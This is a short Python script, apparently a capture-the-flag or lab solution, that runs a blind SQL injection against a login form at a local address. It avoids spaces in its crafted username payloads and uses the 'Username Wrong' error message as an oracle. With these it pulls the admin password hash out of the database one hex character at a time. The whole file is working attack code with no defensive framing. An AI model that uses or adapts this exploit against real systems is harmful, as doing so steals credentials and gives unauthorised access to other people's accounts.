# -*- coding: utf-8 -*-
import requests
url = 'http://192.168.138.12:8002/'
def check(payload):
    postdata = {'username':payload,'password':'xx'}
    r = requests.post(url, postdata).content
    return 'Username Wrong' in r

password  = ''
s = r'0123456789abcdef'

for i in xrange(32,0,-1):
    for c in s:
        payload = '\'or(mid((select(password)from(admin))from(%d))<>\'%s\')#' % (i, (c+password))
        if check(payload):
            password = c + password
            break
    print password
